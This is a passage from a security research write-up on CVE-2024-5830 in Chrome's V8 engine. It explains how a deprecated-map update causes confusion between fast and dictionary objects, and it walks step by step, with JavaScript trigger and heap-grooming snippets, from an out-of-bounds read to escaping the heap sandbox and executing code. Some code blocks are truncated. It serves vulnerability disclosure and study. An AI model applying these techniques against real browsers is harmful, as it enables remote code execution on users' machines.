<p><img decoding="async" src="https://github.blog/wp-content/uploads/2024/08/daigram1.png?w=697&amp;resize=697%2C361" alt="Diagram showing the two new maps that have been created." width="697" height="361" loading="lazy" srcset="https://github.blog/wp-content/uploads/2024/08/daigram1.png?w=697&amp;resize=697%2C361 697w, https://github.blog/wp-content/uploads/2024/08/daigram1.png?w=300 300w" sizes="(max-width: 697px) 100vw, 697px" data-recalc-dims="1"></p>
<p>In the above image, the red maps become deprecated and the green maps are newly created maps. After the property assignment, <code>obj</code> will be using the newly created map that has properties <code>a</code>, <code>b</code> and <code>c</code> and the transitions to the deprecated red maps are removed and replaced by the new green transitions.</p>
<p>In v8, object properties can be stored in an array or in a dictionary. Objects with properties stored in an array are referred to as fast objects, while objects with properties in dictionaries are dictionary objects. Map transitions and deprecations are specific to fast objects and normally, when a map deprecation happens, another fast map is created by <code>UpdateImpl</code>. This, however, is not necessarily the case. Let’s take a look at a slightly different example:</p>
<pre><code>
obj = {a : 1};
obj.b = 1;    //&lt;---- MapB
obj.c = 1;    //&lt;---- MapC

obj2 = {a : 1};
obj2.b = 1;  //&lt;----- MapB
obj2.b = 1.1;   //&lt;---- map of obj becomes deprecated
</code></pre>
<p>Assigning a <code>HeapNumber</code> to <code>obj2.b</code> causes both the original map of <code>obj2</code> (<code>MapB</code>), as well as the map of <code>obj</code> (<code>MapC</code>) to become deprecated. This is because the map of <code>obj</code> (<code>MapC</code>) is now a transition of a deprecated map (<code>MapB</code>), which causes it to become deprecated as well:</p>
<p><img decoding="async" src="https://github.blog/wp-content/uploads/2024/08/diagram2.png?w=688&amp;resize=688%2C358" alt="Diagram showing the deprecation of previous maps." width="688" height="358" loading="lazy" srcset="https://github.blog/wp-content/uploads/2024/08/diagram2.png?w=688&amp;resize=688%2C358 688w, https://github.blog/wp-content/uploads/2024/08/diagram2.png?w=300 300w" sizes="(max-width: 688px) 100vw, 688px" data-recalc-dims="1"></p>
<p>As <code>obj</code> now has a deprecated map, its map will be updated when any of its property is accessed:</p>
<pre><code>
x = obj.a; //&lt;---- calls UpdateImpl to update the map of obj
</code></pre>
<p>In this case, a new map has to be created and a new transition is added to the map of <code>obj2</code>. However, there is a limited number of transitions that a map can hold. Prior to adding a new transition, a <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/map-updater.cc;l=999">check</a> is carried out to ensure that the map can hold another transition:</p>
<pre><code>
MapUpdater::State MapUpdater::ConstructNewMap() {
  ...
  if (maybe_transition.is_null() &amp;&amp;
      !TransitionsAccessor::CanHaveMoreTransitions(isolate_, split_map)) {
    return Normalize("Normalize_CantHaveMoreTransitions");
  }
  ...
</code></pre>
<p>If no more transitions can be added, then a new dictionary map will be created via <code>Normalize</code>.</p>
<pre><code>
obj = {a : 1};
obj.b = 1;
obj.c = 1;

obj2 = {a : 1};
obj2.b = 1.1;   //&lt;---- map of obj becomes deprecated

//Add transitions to the map of obj2
for (let i = 0; i &lt; 1024 + 512; i++) {
  let tmp = {a : 1};
  tmp.b = 1.1;
  tmp['c' + i] = 1;
}

obj.a = 1; //&lt;----- calls UpdateImpl to update map of obj
</code></pre>
<p>As the map of <code>obj2</code> cannot hold anymore transitions, a new dictionary map is created for <code>obj</code> after its property is accessed. This behavior is somewhat unexpected, so <code>Update</code> is often followed by a debug assertion to ensure that the updated map is not a dictionary map (<code>DCHECK</code> is only active in a debug build):</p>
<pre><code>

<p>While most uses of the function <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/map.cc;l=1903"><code>PrepareForDataProperty</code></a> cannot result in a dictionary map after <code>Update</code> is called, <code>PrepareForDataProperty</code> can be called by <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/js-objects.cc;l=4088"><code>CreateDataProperty</code></a> via <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/js-objects.cc;l=3539"><code>TryFastAddDataProperty</code></a>, which may result in a dictionary map after updating. There are different paths that use <code>CreateDataProperty</code>, but one particularly interesting path is in object cloning. When an object is copied using the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax#spread_in_object_literals">spread syntax</a>, a shallow copy of the original object is created:</p>
<pre><code>
var obj1 = {a : 1};
const clonedObj = { ...obj1 };
</code></pre>
<p>In this case, <code>CreateDataProperty</code> is used for creating new properties in <code>clonedObj</code> and to update its map when appropriate. However, if the object being cloned, <code>obj1</code> contains a property accessor, then it’ll be called while the object is being cloned. For example, in the following case:</p>
<pre><code>
var x = {};
x.a0 = 1;
x.__defineGetter__("prop", function() {
  return 1;
});

var y = {...x};
</code></pre>
<p>In this case, when <code>x</code> is cloned into <code>y</code>, the property accessor <code>prop</code> in <code>x</code> is called after the property <code>a0</code> is copied to <code>y</code>. At this point, the map of <code>y</code> contains only the <code>SMI</code> property <code>a0</code> and it is possible for the accessor to cause the map of <code>y</code> to become deprecated.</p>
<pre><code>
var x = {};
x.a0 = 1;
x.__defineGetter__("prop", function() {
  let obj = {};
  obj.a0 = 1;   //&lt;--- obj has same map as y at this point
  obj.a0 = 1.5;  //&lt;--- map of y becomes deprecated
  return 1;
});

var y = {...x};
</code></pre>
<p>When <code>CreateDataProperty</code> is called to copy the property <code>prop</code>, <code>Update</code> in <code>PrepareForDataProperty</code> is called to update the deprecated map of <code>y</code>. As explained before, by adding transitions to the map of <code>obj</code> in the property accessor, it is possible to cause the map update to return a dictionary map for <code>y</code>. Since the subsequent use of the updated map in <code>PrepareForDataProperty</code> assumes the updated map to be a fast map, rather than a dictionary map, this can corrupt the object <code>y</code> in various ways.</p>

<p>To begin with, let’s take a look at how the updated map is used in <code>PrepareForDataProperty</code>:</p>
<pre><code>
Handle<map> Map::PrepareForDataProperty(Isolate* isolate, Handle<map> map,
                                        InternalIndex descriptor,
                                        PropertyConstness constness,
                                        Handle</map></map></code></pre>
<p>The updated <code>map</code> is first used by <code>UpdateDescriptorForValue</code>.</p>
<pre><code>
Handle<map> UpdateDescriptorForValue(Isolate* isolate, Handle<map> map,
                                     InternalIndex descriptor,
                                     PropertyConstness constness,
                                     Handle</map></map></code></pre>
<p>Within <code>UpdateDescriptorForValue</code> the <code>instance_descriptors</code> of <code>map</code> are accessed. The <code>instance_descriptors</code> contain information about properties in the map but it is only relevant for fast maps. For a dictionary map, it is always an empty array with zero length. Accessing <code>instance_descriptors</code> of a dictionary map would therefore result in out-of-bounds (OOB) access to the empty array. In particular, the call to <code>ReconfigureToDataField</code> can modify entries in the <code>instance_descriptors</code>. While this may look like a promising OOB write primitive, the problem is that zero length descriptor arrays in v8 point to the <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/roots/roots.h;l=90">empty_descriptor_array</a> that is stored in a read-only region:</p>
<pre><code>
V(DescriptorArray, empty_descriptor_array, EmptyDescriptorArray)
</code></pre>
<p>Any OOB write to the <code>empty_descriptor_array</code> is only going to write to the read-only memory region and cause a crash. To avoid this, I need to cause <code>CanHoldValue</code> to return <code>true</code> so that <code>ReconfigureToDataField</code> is not called. In the call to <code>CanHoldValue</code>, an OOB entry to the <code>empty_descriptor_array</code> is read and then certain conditions are checked:</p>
<pre><code>
bool CanHoldValue(Tagged descriptors, InternalIndex descriptor,
                  PropertyConstness constness, Tagged</code></pre>
<p>Although <code>empty_descriptor_array</code> is stored in a read-only region and I cannot control the memory content that is behind it, the read index, <code>descriptor,</code> is the array index that corresponds to the property <code>prop</code>, which I can control. By changing the number of properties that precede <code>prop</code> in <code>x</code>, I can control the OOB read offset to the <code>empty_descriptor_array</code>. This allows me to choose an appropriate offset so that the conditions in <code>CanHoldValue</code> are satisfied.</p>
<p>While this avoids an immediate crash, it is not exactly useful as far as exploits go. So, let’s take a look at what comes next after a dictionary map is returned from <code>PrepareForDataProperty</code>.</p>
<pre><code>
bool CanHoldValue(Tagged descriptors, InternalIndex descriptor,
                  PropertyConstness constness, Tagged</code></pre>
<p>After the <code>new_map</code> returned, its <code>instance_descriptors</code>, which is the <code>empty_descriptor_array</code>, is read again at offset <code>descriptor</code>, and the result is used to provide another offset in a property write:</p>
<pre><code>
void JSObject::WriteToField(InternalIndex descriptor, PropertyDetails details,
                            Tagged</code></pre>
<p>In the above, <code>index</code> is encoded in the <code>PropertyDetails</code> and is used in <code>FastPropertyAtPut</code> to write a property in the resulting object. However, <code>FastPropertyAtPut</code> assumes that the object has fast properties stored in a <code>PropertyArray</code> while our object is in fact a dictionary object with properties stored in a <code>NameDictionary</code>. This causes confusion between <code>PropertyArray</code> and <code>NameDictionary</code>, and because <code>NameDictionary</code> contains a few more internal fields than <code>PropertyArray</code>, writing to a <code>NameDictionary</code> using an offset that is meant for a <code>PropertyArray</code> can end up overwriting some internal fields in the <code>NameDictionary</code>. A common way to exploit a confusion between fast and dictionary objects is to overwrite the <code>capacity</code> field in the <code>NameDictionary</code>, which is used for checking the bounds when the <code>NameDictionary</code> is accessed (similar to the method that I used to exploit another v8 bug in this <a href="https://github.blog/2023-09-26-getting-rce-in-chrome-with-incorrect-side-effect-in-the-jit-compiler/#exploiting-the-bug">post</a>).</p>
<p>However, as I cannot fully control the <code>PropertyDetails</code> that comes from the OOB read of the <code>empty_descriptor_array</code>, I wasn’t able to overwrite the <code>capacity</code> field of the <code>NameDictionary</code>. Instead, I managed to overwrite another internal field, <code>elements</code> of the <code>NameDictionary</code>. Although the <code>elements</code> field is not normally used for property access, it is used in <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/js-objects.cc;l=3779"><code>MigrateSlowToFast</code></a> as a bound for accessing dictionary properties:</p>
<pre><code>
void JSObject::MigrateSlowToFast(Handle object,
                                 int unused_property_fields,
                                 const char* reason) {
  ...
  Handle iteration_order;
  int iteration_length;
  if constexpr (V8_ENABLE_SWISS_NAME_DICTIONARY_BOOL) {
    ...
  } else {
    ...
    iteration_length = dictionary-&gt;NumberOfElements();  //&lt;---- elements field
  }
  ...
  for (int i = 0; i get(i)));
      k = dictionary-&gt;NameAt(index);

      value = dictionary-&gt;ValueAt(index);     //DetailsAt(index);
    }
    ...
  }
  ...
}
</code></pre>
<p>In <code>MigrateSlowToFast</code>, <code>dictionary-&amp;gt;NumberOfElements()</code> is used as a bound of the property offsets in a loop that accesses the property <code>NameDictionary</code>. So by overwriting <code>elements</code> to a large value, I can cause OOB read when the property values are read in the loop. These property values are then copied to a newly created fast object. By arranging the heap carefully, I can control the <code>value</code> that is read and have it point to a fake object in the v8 heap.</p>
<p><img decoding="async" src="https://github.blog/wp-content/uploads/2024/08/diagram3.png?w=685&amp;resize=685%2C587" alt="Diagram displaying how to control the value that is read and have it point to a fake object in the v8 heap." width="685" height="587" loading="lazy" srcset="https://github.blog/wp-content/uploads/2024/08/diagram3.png?w=685&amp;resize=685%2C587 685w, https://github.blog/wp-content/uploads/2024/08/diagram3.png?w=300 300w" sizes="(max-width: 685px) 100vw, 685px" data-recalc-dims="1"></p>
<p>In the above, the green box is the actual bounds of the <code>NameDictionary</code>, however, with a corrupted <code>elements</code> field, an OOB access can happen during <code>MigrateSlowToFast</code>, causing it to access the value in the red box, and use it as the value of the property. By arranging the heap, I can place arbitrary values in the red box, and in particular, I can make it point to a fake object that I created.</p>
<p>Heap arrangement in v8 is fairly straightforward as objects are allocated linearly in the v8 heap. To place control values after the <code>NameDictionary</code>, I can allocate arrays after the object is cloned and then write control values to the array entries.</p>
<pre><code>
var y = {...x};  //&lt;---- NameDictionary allocated

//Placing control values after the NameDictionary
var arr = new Array(256);
for (let i = 0; i &lt; 7; i++) {
  arr[i] = new Array(256);
  for (let j = 0; j &lt; arr[i].length; j++) {
    arr[i][j] = nameAddrF;
  }
}
</code></pre>
<p>To make sure that the value I placed after the <code>NameDictionary</code> points to a fake object, I need to know the address of the fake object. As I pointed out in a <a href="https://powerofcommunity.net/poc2022/ManYueMo.pdf">talk</a> that I gave at the <a href="https://powerofcommunity.net/2022.htm">POC2022</a> conference, object addresses in v8 can be predicted reliably by simply knowing the version of Chrome. This allows me to work out the address of the fake object to use:</p>
<pre><code>
var dblArray = [1.1,2.2];
var dblArrayAddr = 0x4881d;  //&lt;---- address of dblArray is consistent across runs

var dblArrayEle = dblArrayAddr - 0x18;
//Creating a fake double array as an element with length 0x100
dblArray[0] = i32tof(dblArrMap, 0x725);
dblArray[1] = i32tof(dblArrayEle, 0x100);
</code></pre>
<p>By using the known addresses of objects and their maps, I can create both the fake object and also obtain its address.</p>
<p>Once the heap is prepared, I can trigger <code>MigrateSlowToFast</code> to access the fake object. This can be done by first making the cloned object, <code>y</code>, a prototype of another object, <code>z</code>. Accessing any property of <code>z</code> will then trigger <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/ic/ic.cc;l=441;bpv=0;bpt=0"><code>MakePrototypesFast</code></a>, which calls <code>MigrateSlowToFast</code> for the object <code>y</code>:</p>
<pre><code>
var z = {};
z.__proto__ = y;
z.p;    //&lt;------ Calls MigrateSlowToFast for y
</code></pre>
<p>This then turns <code>y</code> into a fast object, with the fake object that I prepared earlier accessible as a property of <code>y</code>. A useful fake object is a fake double array with a large <code>length</code>, which can then be used to cause an OOB access to its elements.</p>
<p>Once an OOB access to the fake double array is achieved, gaining arbitrary read and write in the v8 heap is rather straightforward. It essentially consists of the following steps:</p>
<ol>
<li>First, place an <code>Object</code> <code>Array</code> after the fake double array, and use the OOB read primitive in the fake double array to read the addresses of the objects stored in this array. This allows me to obtain the address of any V8 object.</li>
<li>Place another double array, <code>writeArr</code> after the fake double array, and use the OOB write primitive in the fake double array to overwrite the <code>element</code> field of <code>writeArr</code> to an object address. Accessing the elements of <code>writeArr</code> then allows me to read/write to arbitrary addresses.</li>
</ol>
<h2 id="thinking-outside-of-the-heap-sandbox">Thinking outside of the heap sandbox<a href="#thinking-outside-of-the-heap-sandbox" aria-label="Thinking outside of the heap sandbox"></a></h2>
<p>The recently introduced <a href="https://v8.dev/blog/sandbox">v8 heap sandbox</a> isolates the v8 heap from other process memory, such as executable code, and prevents memory corruptions within the v8 heap from accessing memory outside of the heap. To gain code execution, a way to escape the heap sandbox is needed.</p>
<p>In Chrome, <a href="https://developer.mozilla.org/en-US/docs/Web/API">Web API</a> objects, such as the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model"><code>DOM</code></a> object, are implemented in <a href="https://www.chromium.org/blink/">Blink</a>. Objects in Blink are allocated outside of the v8 heap and are represented as api objects in v8:</p>
<pre><code>
var domRect = new DOMRect(1.1,2.3,3.3,4.4);
%DebugPrint(domRect);

DebugPrint: 0x7610003484c9: [[api object] 0]
 ...
 - embedder fields: 2
 - properties: 0x7610000006f5 
 - All own properties (excluding elements): {}
 - embedder fields = {
    0, aligned pointer: 0x7718f770b880
    0, aligned pointer: 0x325d00107ca8
 }
0x7610003b6985: [Map] in OldSpace
 - map: 0x76100022f835 &lt;MetaMap (0x76100022f885 )&gt;
 - type: [api object] 0
 ...
</code></pre>
<p>These objects are essentially wrappers to objects in Blink, and they contain two <code>embedder fields</code> that store the locations of the actual Blink object, as well as their actual type. Although <code>embedder fields</code> show up as pointer values in the <code>DebugPrint</code>, because of the heap sandbox, they are not actually stored as pointers in the v8 object, but as indices to a lookup table that is protected from being modified within the v8 heap.</p>
<pre><code>
bool EmbedderDataSlot::ToAlignedPointer(Isolate* isolate,
                                        void** out_pointer) const {
  ...
#ifdef V8_ENABLE_SANDBOX
  // The raw part must always contain a valid external pointer table index.
  *out_pointer = reinterpret_cast(
      ReadExternalPointerField(
          address() + kExternalPointerOffset, isolate));
  return true;
  ...
}
</code></pre>
<p>The external look up table ensures that an <code>embedder field</code> must be a valid index in the table, and also any pointer returned from reading the <code>embedder field</code> must point to a valid Blink object. However, with arbitrary read and write in the v8 heap, I can still replace the <code>embedder field</code> of one api object by the <code>embedder field</code> of another api object that has a different type in Blink. This can then be used to cause type confusion in the Blink object.</p>
<p>In particular, I can cause a type confusion between a <a href="https://developer.mozilla.org/en-US/docs/Web/API/DOMRect"><code>DOMRect</code></a> and a <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:third_party/blink/renderer/core/typed_arrays/dom_typed_array.h;l=15"><code>DOMTypedArray</code></a>. A <code>DOMRect</code> is a simple data structure, with four properties <code>x</code>, <code>y</code>, <code>width</code>, <code>height</code> specifying its dimensions. <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:third_party/blink/renderer/core/geometry/dom_rect.h;l=36;bpv=0;bpt=0">Accessing these properties</a> simply involves writing to and reading from the corresponding offsets in the <code>DOMRect</code> Blink object. By causing a type confusion between a <code>DOMRect</code> and another other Blink object, I can read and write the values of any Blink object from these offsets. In particular, by confusing a <code>DOMRect</code> with a <code>DOMTypedArray</code>, I can overwrite its <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:third_party/blink/renderer/core/typed_arrays/array_buffer/array_buffer_contents.h;l=157"><code>backing_store_</code></a> pointer, which points to the data storage of the <code>DOMTypedArray</code>. Changing the <code>backing_store_</code> to an arbitrary pointer value and then accessing entries in the <code>DOMTypedArray</code> then gives me arbitrary read and write access to the entire memory space.</p>
<p>To defeat ASLR and identify useful addresses in the process memory, note that each api object also contains an <code>embedder field</code> that stores a pointer to the <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:third_party/blink/renderer/platform/bindings/script_wrappable.h;l=211;bpv=0;bpt=0"><code>wrapper_type_info</code></a> of the Blink object. Since these <code>wrapper_type_info</code> are global static objects, by confusing this <code>embedder field</code> with a <code>DOMRect</code> object, I can read the pointer to the <code>wrapper_type_info</code> as a property in a <code>DOMRect</code>. In particular, I can now read the address of the <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/common/ptr-compr.cc;l=26;bpv=0;bpt=0"><code>TrustedCage::base_</code></a>, which is the offset to a memory region that contains important objects such as JIT code addresses etc. I can now simply compile a JIT function, and modify the address of its JIT code to achieve arbitrary code execution.</p>
<p>The exploit can be found <a href="https://github.com/github/securitylab/tree/main/SecurityExploits/Chrome/v8/CVE_2024_5830">here</a> with some setup notes.</p>
<h2 id="conclusion">Conclusion<a href="#conclusion" aria-label="Conclusion"></a></h2>
<p>In this post, I’ve looked at <a href="https://github.com/advisories/GHSA-fchp-8m28-g68f">CVE-2024-5830</a>, a confusion between fast and dictionary objects caused by updating of a deprecated map. Map transition and deprecation often introduces complex and subtle problems and has also led to issues that were <a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-16009.html">exploited in the wild</a>. In this case, updating a deprecated map causes it to become a dictionary map unexpectedly, and in particular, the resulting dictionary map is used by code that assumes the input to be a fast map. This allows me to overwrite an internal property of the dictionary map and eventually cause an OOB access to the dictionary. I can then use this OOB access to create a fake object, leading to arbitrary read and write of the v8 heap.</p>
<p>To bypass the v8 heap sandbox, I modify API objects that are wrappers of Blink objects in v8, causing type confusions in objects outside of the heap sandbox. I then leverage this to achieve arbitrary memory read and write outside of the v8 heap sandbox, and in turn arbitrary code execution in the Chrome renderer process.</p>
